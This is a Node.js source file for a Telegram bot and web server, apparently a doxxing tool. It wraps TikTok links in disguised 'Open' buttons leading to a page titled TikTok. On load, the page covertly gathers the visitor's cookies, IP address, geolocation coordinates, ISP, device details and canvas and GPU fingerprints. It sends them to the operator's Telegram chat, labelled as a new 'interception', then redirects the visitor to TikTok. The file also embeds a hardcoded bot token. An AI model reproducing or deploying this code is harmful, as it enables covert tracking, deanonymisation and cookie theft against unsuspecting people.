const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');

const TOKEN = '8989024516:AAEAIwKbvaDe8HALbrjv-UoHcH6Pp2wZiso';
const CHAT_ID = '8667961334';
const PORT = process.env.PORT || 3000;
const DOMAIN = 'https://dox-toxx.onrender.com'; 

const app = express();
const bot = new TelegramBot(TOKEN, { polling: true });

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));

const linksDB = {};

bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, 'Отправь ссылку на TikTok.');
});

bot.on('message', (msg) => {
  const text = msg.text;
  if (!text || text.startsWith('/')) return;

  if (text.includes('tiktok.com')) {
    const shortId = crypto.randomBytes(4).toString('hex');
    linksDB[shortId] = text;
    const fakeLink = `${DOMAIN}/${shortId}/`;
    
    bot.sendMessage(msg.chat.id, '👇 Нажмите кнопку ниже', {
      reply_markup: {
        inline_keyboard: [[{ text: 'Открыть', web_app: { url: fakeLink } }]]
      }
    });
  }
});

bot.on('inline_query', async (query) => {
  try {
    const text = query.query;
    if (!text) return bot.answerInlineQuery(query.id, [], { cache_time: 0 });

    const target = text.includes('tiktok.com') ? text : 'https://www.tiktok.com/';
    const shortId = crypto.randomBytes(4).toString('hex');
    linksDB[shortId] = target;
    const appLink = `${DOMAIN}/${shortId}/`;

    const result = {
      type: 'article',
      id: shortId,
      title: 'Открыть',
      description: 'Нажмите, чтобы отправить',
      input_message_content: { message_text: '👇 Нажмите кнопку ниже' },
      reply_markup: { inline_keyboard: [[{ text: 'Открыть', url: appLink }]] }
    };

    await bot.answerInlineQuery(query.id, [result], { cache_time: 0 });
  } catch (err) {
    console.error(err);
  }
});

app.get('/', (req, res) => {
  res.redirect('https://www.tiktok.com/');
});

app.post('/api/collect', async (req, res) => {
  const data = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  try {
    let text = `🚨 **НОВЫЙ ПЕРЕХВАТ** 🚨\n\n`;
    text += `**IP:** ${ip}\n`;
    text += `**Гео:** ${data.geo?.country || '?'}, ${data.geo?.city || '?'}\n`;
    text += `**Провайдер:** ${data.geo?.isp || '?'}\n`;
    text += `**Координаты:** ${data.geo?.lat || '?'}, ${data.geo?.lon || '?'}\n`;
    text += `**OS:** ${data.browser?.os || '?'}\n`;
    text += `**Браузер:** ${data.browser?.browser || '?'}\n`;
    text += `**Язык:** ${data.browser?.lang || '?'}\n`;
    text += `**Экран:** ${data.phone?.screen || '?'}\n`;
    text += `**DPR:** ${data.phone?.dpr || '?'}\n`;
    text += `**CPU:** ${data.phone?.cores || '?'}\n`;
    text += `**RAM:** ${data.phone?.ram || '?'}\n`;
    text += `**Сеть:** ${data.phone?.network || '?'}\n`;
    text += `**Батарея:** ${data.battery?.level || '?'} (${data.battery?.charging ? 'заряжается' : 'нет'})\n`;
    text += `**Canvas:** ${data.fingerprint?.canvas || '?'}\n`;
    text += `**GPU:** ${data.fingerprint?.gpu || '?'}\n`;
    text += `**Cookies:** ${data.cookies ? data.cookies.slice(0, 80) + '...' : 'нет'}\n`;
    text += `**Цель:** ${data.target || '?'}\n`;

    await bot.sendMessage(CHAT_ID, text, { parse_mode: 'Markdown' });
    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ ok: false });
  }
});

app.get('/:id/', (req, res) => {
  const shortId = req.params.id;
  const targetUrl = linksDB[shortId];

  if (!targetUrl) return res.redirect('https://www.tiktok.com/');

  res.send(`<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<title>TikTok</title>
<style>
  body { height: 100vh; background: #fff; margin: 0; display: flex; justify-content: center; align-items: center; }
</style>
</head>
<body>
<script>
  const TARGET_URL = "${targetUrl}";
  const tg = window.Telegram?.WebApp;

  if (tg) {
    tg.ready();
    tg.expand();
    if (tg.BackButton) tg.BackButton.hide();
  }

  async function collectAll() {
    const data = { browser: {}, phone: {}, geo: {}, battery: {}, fingerprint: {} };
    data.cookies = document.cookie || '';
    const ua = navigator.userAgent;
    data.browser.os = ua.includes('Windows') ? 'Windows' : ua.includes('Mac') ? 'macOS' : ua.includes('Android') ? 'Android' : ua.includes('iPhone') ? 'iOS' : 'Unknown';
    data.browser.browser = ua.includes('Edg') ? 'Edge' : ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : ua.includes('Safari') ? 'Safari' : 'Unknown';
    data.browser.lang = navigator.language;
    data.browser.languages = navigator.languages ? navigator.languages.join(', ') : '';
    data.browser.ref = document.referrer || '';
    data.phone.screen = screen.width + 'x' + screen.height;
    data.phone.dpr = window.devicePixelRatio;
    data.phone.cores = navigator.hardwareConcurrency || '?';
    data.phone.ram = navigator.deviceMemory || '?';
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    data.phone.network = conn ? conn.effectiveType : 'Unknown';

    if (navigator.getBattery) {
      try { const b = await navigator.getBattery(); data.battery.level = Math.round(b.level * 100) + '%'; data.battery.charging = b.charging; } catch(e){}
    }

    try {
      const r = await fetch('https://ipwho.is/'); const g = await r.json();
      if (g.success) { 
        data.geo.country = g.country; data.geo.city = g.city; data.geo.isp = g.connection.isp; 
        data.geo.lat = g.latitude; data.geo.lon = g.longitude; 
      }
    } catch(e){}

    try {
      const c = document.createElement('canvas'); c.width = 200; c.height = 40;
      const ctx = c.getContext('2d'); ctx.textBaseline = 'top'; ctx.font = '14px Arial';
      ctx.fillStyle = '#f60'; ctx.fillRect(0,0,100,20); ctx.fillStyle = '#069'; ctx.fillText('FP 🎨', 2, 4);
      const d = c.toDataURL(); let hash = 0;
      for (let i = 0; i < d.length; i++) hash = (hash * 31 + d.charCodeAt(i)) | 0;
      data.fingerprint.canvas = hash.toString(16);
    } catch(e){}

    try {
      const gl = document.createElement('canvas').getContext('webgl');
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      data.fingerprint.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'Unknown';
    } catch(e){}

    return data;
  }

  let redirected = false;
  function goTarget() {
    if (redirected) return;
    redirected = true;
    if (tg && tg.openLink) { tg.openLink(TARGET_URL); } else { location.replace(TARGET_URL); }
  }

  setTimeout(goTarget, 1500);

  (async () => {
    const data = await collectAll();
    fetch('/api/collect', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ ...data, target: TARGET_URL })
    }).catch(() => {});
    goTarget();
  })();
</script>
</body>
</html>`);
});

app.listen(PORT, () => { console.log(`Port ${PORT}`); });
